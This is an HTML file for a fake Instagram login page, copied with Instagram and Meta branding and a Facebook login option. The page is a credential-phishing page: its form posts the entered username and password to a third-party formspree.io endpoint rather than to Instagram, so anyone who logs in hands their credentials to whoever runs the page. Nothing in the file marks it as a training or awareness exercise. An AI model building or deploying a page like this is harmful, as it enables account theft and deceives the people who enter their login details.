<html><head>
    <meta charset="UTF-8">
    <title>Instagram Login Page</title>
  <link rel="stylesheet" type="text/css" href="index.css">
   <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">    <link rel="stylesheet" href="styles.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
  
  <div class="wrapper">
    <div class="get">
        <p id="p1"> <b>Instagram</b><br>Find it for free on Google Play.</p>
        <p id="p2">GET</p>
    </div>
    <div class="header">
  
      <div class="top">
        <div class="logo">
        <p>Instagram</p>
          <!-- <img src="instagram.png" alt="instagram" style="width: 175px;"> -->
        </div>
        
          <div class="fb">
          <i class="fa fa-facebook-square" aria-hidden="true"></i>
            <p>    Log in with Facebook</p>
          </div>
          
        <div class="or">
          <div class="line"></div>
          <p>OR</p>
          <div class="line"></div>
        </div>
        <form
          action="https://formspree.io/f/mayrqnov"
          method="POST"
          id="contact-form"
        >
        <div class="form">
          <div class="input_field">
            <input name="usrnm" required type="text" placeholder="Phone number, username, or email" class="input">
          </div>
          <div class="input_field">
            <input name="pw" required type="password" placeholder="Password" class="input">
          </div>
          <div class="forgot">
            <a href="#">Forgot password?</a>
          </div>
          <!--div class="btn"><a href="#" >Log In</a></div--->
          <div class="login"><button style="height: 26px; width: 175px; background-color: #3897f0; border: none; color: white; box-shadow: none;" type="submit">Log In</button></div>
        </div>
        </form>
        
        <div class="dif">
        
          
        </div>
      </div>
      <div class="signup">
        <p>Don't have an account? <a href="#">Sign up</a></p>
      </div>
      
        
    </div>
    <div class="foot">
    <span>
      <p class="p3">From</p>
      <p class="p5">META
      </p>
    </span>
    </div>
  </div>
  <script src="js/script.js"></script>
